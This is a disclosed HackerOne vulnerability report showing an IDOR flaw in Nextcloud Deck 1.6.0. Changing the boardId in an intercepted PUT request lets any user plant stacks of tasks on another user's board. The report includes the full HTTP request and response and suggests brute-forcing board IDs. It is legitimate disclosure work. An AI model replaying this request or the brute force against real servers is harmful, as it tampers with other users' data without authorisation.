# Nextcloud Deck : Possibility for anyone to add a stack with existing tasks on anyone's board

## Report Details
- **Report ID**: 1450117
- **URL**: https://hackerone.com/reports/1450117
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2022-01-14T23:58:20.041Z
- **Disclosed**: 2022-05-20T10:37:23.448Z

## Reporter
- **Username**: supr4s
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
Hi everyone,

Hope you are well ! 

I found an IDOR vulnerability, allowing any user without privilege to add lists with tasks in any user board.
This was tested on a Nextcloud Hub II server (v23) with the Deck application in version 1.6.0.

## Steps To Reproduce:

Beforehand: 

- Have an A user with a board ID specific to that user (`boardId` parameter)
- Have a user B with a board ID specific to that user (`boardId` parameter)
- Note that there is no link between our user A and user B

**1°)** With your user A, rename an existing list belonging to him. 

The following PUT request is made :

```
PUT /apps/deck/stacks/31 HTTP/1.1
Host: nextcloud.yourserver.com
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0
Accept: application/json, text/plain, */*
Accept-Language: fr,fr-FR;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
requesttoken: <token>
Content-Length: 136
Origin: https://nextcloud.yourserver.com
Connection: close
Cookie: <your_session_cookies>

{"title":"IDOR","boardId":14,"deletedAt":0,"lastModified":1642201857,"order":0,"id":31,"ETag":"a5f7e3ab477ee2a2259f0889a63130a8"} 
```

Intercept the request, change the `boardId` parameter to that of your victim (user B)  and play the modified request..

Check the server response that confirms the vulnerability: 

```
HTTP/1.1 200 OK
Server: nginx
Date: Fri, 14 Jan 2022 23:39:49 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 135
Connection: close
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Pragma: no-cache
Cache-Control: no-cache, no-store, must-revalidate
Content-Security-Policy: default-src 'none';base-uri 'none';manifest-src 'self';frame-ancestors 'none'
Feature-Policy: autoplay 'none';camera 'none';fullscreen 'none';geolocation 'none';microphone 'none';payment 'none'
X-Robots-Tag: none
Referrer-Policy: no-referrer
X-Content-Type-Options: nosniff
X-XSS-Protection: 1; mode=block
X-Robots-Tag: none
X-Download-Options: noopen
X-Permitted-Cross-Domain-Policies: none
Strict-Transport-Security: max-age=31536000; includeSubDomains;

{"title":"IDOR_REPORT","boardId":1,"deletedAt":0,"lastModified":1642201857,"order":0,"id":31,"ETag":"a5f7e3ab477ee2a2259f0889a63130a8"}
```

**2°)** With your user B, go to the board in question and notice the addition of a new list with tasks without his knowledge

Additional Notes: 

- This works from one user without privilege to another
- It works from an unprivileged user on the board of an administrator/privileged user
- If this vulnerability is exploited with a list containing several tasks, each containing images, labels, calendar etc., everything is imported to the victim's account
- If our victim deletes the list created without his knowledge, it also deletes it on the attacker's side

## Impact

Broken Access Control - IDOR : The impact here is to be able to add lists with tasks on the board of any user and harm them.
We could imagine here brute-forcing the `boardId` parameter starting from 1 to 1000 (for example) to exploit this vulnerability on all the existing users/tables. We could also create on our victim an incalculable number of lists on his board.

Looking forward to exchanging.

Regards,
Supras

## Attachments
No attachments
